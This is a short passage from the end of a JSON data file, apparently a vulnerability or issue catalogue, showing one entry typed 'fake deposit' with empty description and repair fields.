                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    }
]